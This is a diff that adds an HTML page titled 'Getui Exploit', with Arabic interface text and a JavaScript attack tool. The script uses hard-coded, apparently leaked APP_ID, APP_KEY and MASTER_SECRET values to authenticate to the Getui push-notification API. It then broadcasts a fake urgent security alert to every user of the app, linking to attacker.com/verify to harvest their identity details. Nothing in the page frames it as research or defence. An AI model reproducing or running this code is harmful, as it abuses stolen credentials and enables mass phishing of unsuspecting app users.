@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔥 Getui Exploit</title>
+</head>
+<body>
+    <h1>🚀 Getui Exploit</h1>
+    <button onclick="runExploit()">▶️ تشغيل الاستغلال</button>
+    <pre id="output">⏳ انتظر...</pre>
+
+    <script>
+        // ============================================================
+        // 🔑 المفاتيح المكشوفة
+        // ============================================================
+        const APP_ID = "MYzecv9re49MHZCbb8mpW";
+        const APP_KEY = "DnbmCBfOWf8ejt0hITntF5";
+        const MASTER_SECRET = "wBfbpF3IP19KSHiCh2Q5U3";
+
+        const TITLE = "🔴 تنبيه أمني عاجل";
+        const BODY = "تم اكتشاف محاولة اختراق لحسابك. يرجى تأكيد هويتك فوراً.";
+        const CLICK_URL = "https://attacker.com/verify";
+
+        const output = document.getElementById('output');
+
+        function log(msg) {
+            output.textContent += msg + '\n';
+        }
+
+        // ============================================================
+        // 1️⃣ SHA256
+        // ============================================================
+        async function sha256(message) {
+            const msgBuffer = new TextEncoder().encode(message);
+            const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
+            const hashArray = Array.from(new Uint8Array(hashBuffer));
+            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+        }
+
+        // ============================================================
+        // 2️⃣ الحصول على Token
+        // ============================================================
+        async function getToken() {
+            const timestamp = Date.now().toString();
+            const raw = APP_KEY + timestamp + MASTER_SECRET;
+            const sign = await sha256(raw);
+
+            const payload = { appkey: APP_KEY, timestamp: timestamp, sign: sign };
+
+            try {
+                const response = await fetch(`https://restapi.getui.com/v2/${APP_ID}/auth`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                const data = await response.json();
+                log('📨 Auth: ' + JSON.stringify(data, null, 2));
+
+                if (data.code === 0 && data.data?.token) {
+                    log('✅ Token: ' + data.data.token.slice(0, 30) + '...');
+                    return data.data.token;
+                } else {
+                    log('❌ فشل: ' + JSON.stringify(data));
+                    return null;
+                }
+            } catch(e) {
+                log('❌ خطأ: ' + e);
+                return null;
+            }
+        }
+
+        // ============================================================
+        // 3️⃣ إرسال إشعار للجميع
+        // ============================================================
+        async function sendPushAll(token) {
+            const payload = {
+                request_id: Date.now().toString(),
+                audience: "all",
+                settings: { ttl: 3600000 },
+                push_message: {
+                    notification: {
+                        title: TITLE,
+                        body: BODY,
+                        click_type: "url",
+                        url: CLICK_URL
+                    }
+                }
+            };
+
+            try {
+                const response = await fetch(`https://restapi.getui.com/v2/${APP_ID}/push/all`, {
+                    method: 'POST',
+                    headers: { 'token': token, 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                const data = await response.json();
+                log('📨 Push Response: ' + JSON.stringify(data, null, 2));
+                if (data.code === 0) log('✅ تم الإرسال!');
+                else log('❌ فشل: ' + JSON.stringify(data));
+            } catch(e) {
+                log('❌ خطأ: ' + e);
+            }
+        }
+
+        // ============================================================
+        // 4️⃣ تشغيل
+        // ============================================================
+        async function runExploit() {
+            log('🚀 بدء استغلال Getui...\n');
+            const token = await getToken();
+            if (token) await sendPushAll(token);
+            else log('❌ لا يمكن المتابعة بدون Token.');
+        }
+    </script>
+</body>
+</html>
